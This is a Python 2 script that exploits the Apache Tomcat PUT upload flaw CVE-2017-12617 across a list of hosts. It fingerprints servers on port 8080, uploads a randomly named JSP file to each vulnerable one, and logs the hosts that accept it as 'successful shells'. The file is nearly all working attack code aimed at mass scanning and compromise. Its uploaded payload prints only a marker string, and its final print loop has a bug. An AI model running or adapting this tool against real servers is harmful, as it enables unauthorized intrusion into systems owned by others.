'''
thanks for the help couldnt have figured it out without you and Wei gaos stuff 
https://raw.githubusercontent.com/cyberheartmi9/CVE-2017-12617/master/tomcat-cve-2017-12617.py
'''

import httplib
import threading
import urllib2
import time
import os
import string
from random import *
import requests
import coloredlogs, logging
# Create a logger object.
logger = logging.getLogger(__name__)
# By default the install() function installs a handler on the root logger,
# this means that log messages from your code and log messages from the
# libraries that you use will all show up on the terminal.
coloredlogs.install(level='DEBUG')
# If you don't want to see log messages from libraries, you can pass a
# specific logger object to the install() function. In this case only log
# messages originating from that logger will show up on the terminal.
coloredlogs.install(level='DEBUG', logger=logger)

apache_list = []
succesful_shells = []
files = []
target_port = 8080



def parse_headers(url):

      r = requests.head(url,allow_redirects=False, timeout=3)
      server = r.headers['server']
      print r.headers
      if "Apache-Coyote/1.1" in server:
          return server
         
      else:
          pass

def check_success(url,file_name,content_rand):
    try:
       r = requests.get(url + file_name)
       print r.content
       if content_rand in r.content:
          succesful_shells.append(url + file_name)
          file = open("Results.txt","a")
          file.write(url + file_name + "\n")
          file.close()
          return True
       else:
          pass
    except requests.exceptions.ConnectionError:
       r.status_code = "Connection refused"

def gen_shell():
   min_char = 4
   max_char = 12
   allchar = string.ascii_letters + string.digits
   shell_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
   return shell_name + ".jsp"

def gen_content():
   min_char = 12
   max_char = 32
   allchar = string.ascii_letters + string.digits
   content_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
   return content_name 

def build_hostlist():
    hosts_local = []
    with open('apaches2.txt', 'r') as f:
         for line in map(lambda line: line.rstrip('\n'), f):
             hosts_local.append(line)
    return hosts_local



def construct_put(url,f):
    print url
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    requests.packages.urllib3.disable_warnings()
    req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers,verify=False)
    if req.status_code == 201:
       print "File Created .."
       succesful_shells.append(url+f)
    else:
        pass
    

def main():
    
    targets = build_hostlist()
   
    for hosts in targets:
        url = 'http://'+ hosts + ':'+ format(target_port)+'/'
        try:
           header_result = parse_headers(url)
           shell_name = gen_shell()
           if header_result == "Apache-Coyote/1.1":
              '''apache_list.append(url)
              
              content_random = gen_content()  
              current_dir = os.getcwd()
              shell_dir = current_dir + '\\shells\\'
              final_path = os.path.join(shell_dir ,shell_name)'''
              construct_put(url,shell_name)
              #files.append(final_path)
              
        except:
            pass
 
    '''print "number of shells:"+ format(len(files))+ "\n"
    print "-" * 25
    for shell_names in files:
        print "deleting Shell"
        print shell_names + "\n"
        os.remove(shell_names)'''
        
    for shells in succesful_shells:
        print succesful_shells + '\n'

if __name__ == '__main__':
   main()

